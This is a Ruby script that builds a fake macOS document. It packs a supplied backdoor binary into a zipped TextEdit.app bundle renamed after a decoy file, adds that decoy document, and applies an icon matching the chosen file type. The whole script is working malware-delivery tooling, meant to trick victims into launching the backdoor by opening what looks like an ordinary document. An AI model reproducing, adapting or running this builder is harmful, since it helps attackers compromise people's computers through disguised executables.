#!/usr/bin/ruby

require 'pp'
require 'rubygems'
require 'zipruby'
require 'tempfile'

if __FILE__ == $0

  # prepare the files
  template = 'resources/MacFakeDocument.zip'
  backdoor = ARGV[0]
  output = ARGV[1]
  docname = ARGV[2]
  doc = ARGV[3]
  ext = ARGV[4]

  # sanity check on the parameters
  if ARGV.length < 5 
    puts "Invalid argument count (#{ARGV.length} expected 5)"
    exit(1)
  end
  
  # check the the input exists
  unless File.exists?(backdoor)
    puts "Cannot find input backdoor (" + backdoor + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end

  unless File.size(backdoor) != 0
    puts "Invalid input backdoor (" + backdoor + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end
 
  unless File.exists?(template)
    puts "Cannot find template zip file"
    File.delete(output) if File.exists?(output)
    exit(1)
  end

  icon = 'resources/' + ext + '.icns'
  unless File.exists?(icon)
    puts "Cannot find the icon file " + icon
    File.delete(output) if File.exists?(output)
    exit(1)
  end
  
  File.chmod(0755, backdoor)
  # copy the template in a temporary file
  # stupid windows cannot use File.copy
  tmp = Tempfile.new('fake_doc')
  tmp.close
  tmp = File.new(tmp.path, "wb+")
  tmp.write(File.open(template, "rb+").read)
  tmp.close
  
  begin
    Zip::Archive.open(tmp.path) do |ar|
        n = ar.num_files # number of entries
  
        n.times do |i|
          entry_name = ar.get_name(i) # get entry name from archive
          
          # open entry
          ar.fopen(entry_name) do |f| # or ar.fopen(i) do |f|
              
              new_name = entry_name
              # take the name of the document and rename the fake app
              new_name['TextEdit.app'] = File.basename(docname, File.extname(docname)) + '.app'

              f.rename(new_name)
              
              # this is the executable to be replaced
              if entry_name["__bck__"]
                ar.replace_file(entry_name, backdoor)   
                f.rename(File.dirname(entry_name) + "/Textedit")
              end
              
              # this is the document to be replaced
              if doc && entry_name["__doc__"]
                ar.replace_file(entry_name, doc)   
                f.rename(File.dirname(entry_name) + '/' + docname)
              end

              # this is the icon to be used
              if ext && entry_name["icon.icns"]
                ar.replace_file(entry_name, icon)   
              end
          end
          ar.commit
        end
    end
  rescue => ex
    puts "Failed to modify the ZIP archive"
    File.delete(output) if File.exists?(output)
    exit(1)
  end
  
  # if every thing is ok, generate the output
  # stupid windows cannot use File.copy
  t = File.open(tmp.path, "rb+")
  File.open(output, "wb+").write(t.read)
  t.close

end